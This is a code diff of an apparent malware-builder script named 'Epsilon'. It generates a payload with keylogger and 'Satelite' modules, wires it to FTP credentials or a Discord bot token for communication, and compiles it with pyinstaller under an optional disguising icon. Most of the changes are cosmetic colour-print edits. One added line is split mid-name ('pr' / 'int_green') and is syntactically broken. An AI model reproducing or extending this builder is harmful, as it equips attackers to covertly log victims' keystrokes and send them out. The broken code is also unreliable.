@@ -1,40 +1,52 @@
 import threading 
 import os
 import shutil
+from core.sys_send import *
 
 ASCII_DATA = '''
-        8""""                                 
-        8     eeeee eeeee e  e     eeeee eeeee
-        8eeee 8   8 8   " 8  8     8  88 8   8
-        88    8eee8 8eeee 8e 8e    8   8 8e  8
-        88    88       88 88 88    8   8 88  8
-        88eee 88    8ee88 88 88eee 8eee8 88  8
+                                   
+                    _____         _ _         
+                    |   __|___ ___|_| |___ ___ 
+                    |   __| . |_ -| | | . |   |
+                    |_____|  _|___|_|_|___|_|_|
+                        |_|                  (v 1.0 beta)
+                    
+                    https://www.github.com/sreyas-sreelal/epsilon
 \n\n
 
 '''
-
-print(ASCII_DATA)
+print_title()
+print_white(ASCII_DATA)
 DEBUG = True
 
 
 
-DEBUG = bool(input("Debug mode(True/False) : "))
-Name = input("Provide name of the binary : ")
+DEBUG = bool(input(pr
+int_green("Debug mode(True/False) : ")))
+Name = input(print_yellow("Provide name of the binary : "))
 
-network = input("Input network pathway for communication \n1.Ftp\n2.Discord bot\n")
+print_green("Input network pathway for communication:")
+print_white("1.Ftp")
+print_white("2.Discord bot")
+
+    
+
+network = input(print_white("Select your option : "))
 File = open(Name+'.py','w')
 File.write('import payloads.behaviour\n')
 
 if network == "1":
-    address = input("input ftp address : ")
-    username = input("input ftp username : ")
-    password = input("input ftp password : ")
+    address = input(print_white("input ftp address : "))
+    username = input(print_white("input ftp username : "))
+    password = input(print_white("input ftp password : "))
     File.write('from  network.ftpconn import init_creditinals\n')
     File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
-    keys = input("Give option(s) : ")
-    print("Select yor payloads (seprated by spaces) :")
-    print("1.Satelite")
-    print("2.KeyLogger")
+    
+    print_green("Select yor payloads (seprated by spaces) :")
+    print_white("1.Satelite")
+    print_white("2.KeyLogger")
+    keys = input(print_white("Select your option(s) : "))
+    
     list_keys = [int(k) for k in keys.split(' ')]
     
     for i in list_keys:
@@ -52,11 +64,11 @@ elif network == "2":
     File.write('init_bot("'+token+'")\n')
     File.write('runbot()\n')
     
-iconfile = input("icon file for the binary (if not needed leave it) : ")
+iconfile = input(print_magenta("icon file for the binary (if not needed leave it) : "))
 
 File.close()
 
-Create_Binary = input("Do you want to compile and create binary of created payload? (Y/N)")
+Create_Binary = input(print_yellow("Do you want to compile and create binary of created payload? (Y/N)"))
 
 if Create_Binary == 'Y' or Create_Binary == 'y':
     cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
@@ -68,6 +80,10 @@ if Create_Binary == 'Y' or Create_Binary == 'y':
         cmd = cmd + " --icon="+iconfile
      
     os.system(cmd) 
-    shutil.rmtree(Name)
-    os.remove(Name+'.spec')
+    try:
+        shutil.rmtree(Name)
+        os.remove(Name+'.spec')
+    except:
+        pass
+
     
